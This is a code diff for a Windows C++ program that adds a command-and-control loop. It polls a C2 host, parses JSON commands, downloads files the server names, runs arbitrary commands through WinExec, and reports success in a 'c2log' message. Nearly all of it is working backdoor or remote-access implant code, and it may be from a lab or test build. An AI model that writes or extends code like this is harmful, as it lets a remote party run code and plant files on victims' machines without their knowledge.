@@ -49,16 +49,78 @@ void GetApiId()
 	cJSON_Delete(data);
 }
 
-BOOL sendLog(LPSTR postData)
+BOOL sendLog(LPCSTR postData)
 {
-	
+	LPSTR dataReceived = new char[MAX_HTTP_RESPONSE_SIZE + 1];
+	BOOL reponseStatus = FALSE;
+	ZeroMemory(dataReceived, MAX_HTTP_RESPONSE_SIZE + 1);
+	reponseStatus = Request(CCHOST, CCPORT, L"POST", L"app/test", L"Connection: close\r\nContent-Type: application/json\r\n", (LPVOID)postData, strlen(postData), dataReceived);
+	delete[] dataReceived;
+	return reponseStatus;
+}
+
+void CC()
+{
 	LPSTR dataReceived = new char[MAX_HTTP_RESPONSE_SIZE + 1];
 	ZeroMemory(dataReceived, MAX_HTTP_RESPONSE_SIZE + 1);
-	return Request(L"10.16.45.143", 8081, L"POST", L"app/test", L"Connection: close\r\nContent-Type: application/json\r\n", postData, strlen(postData), dataReceived);
+	Request(CCHOST, CCPORT, L"GET", L"app/cc", L"Connection: close\r\n", NULL, 0, dataReceived);
+	ProcessAPI(dataReceived);
 }
+
 
 void ProcessAPI(LPSTR resp)
 {
 	// parse json
+	cJSON *json = cJSON_Parse(resp);
+	cJSON *method = cJSON_GetObjectItemCaseSensitive(json, "method");
+	cJSON *extra = NULL;
+	// for download
+	TCHAR uri[256];
+	TCHAR filepath[MAX_PATH + 1];
+
+	if(! cJSON_IsString(method) || !method->valuestring) {
+		goto end;
+	}
+	switch (method->valuestring[0]) {
+	case 'd':
+		// download
+		ZeroMemory(uri, sizeof(uri));
+		ZeroMemory(filepath, sizeof(filepath));
+		extra = cJSON_GetObjectItemCaseSensitive(json, "uri");
+		if (!cJSON_IsString(extra) || !extra->valuestring) {
+			goto end;
+		}
+		UTF8ToWideChar(extra->valuestring, uri, 256);
+		extra = cJSON_GetObjectItemCaseSensitive(json, "file");
+		if (!cJSON_IsString(extra) || !extra->valuestring) {
+			goto end;
+		}
+		UTF8ToWideChar(extra->valuestring, filepath, 256);
+		if (Download(CCHOST, CCPORT, uri, filepath)) {
+			goto methodsucc;
+		}
+		else {
+			goto end;
+		}
+		break;
+	case 'r':
+		// run
+
+		extra = cJSON_GetObjectItemCaseSensitive(json, "cmd");
+		if (!cJSON_IsString(extra) || !extra->valuestring) {
+			goto end;
+		}
+		WinExec(extra->valuestring, SW_SHOW);
+		break;
+	default:
+		WriteStrLog("unknown command: ");
+		WriteStrLog(resp);
+		WriteStrLog("\n");
+		goto end;
+	}
+methodsucc:
+	sendLog("{\"method\": \"c2log\", \"msg\": \"success\"}");
+end:
+	cJSON_Delete(json);
 
 }
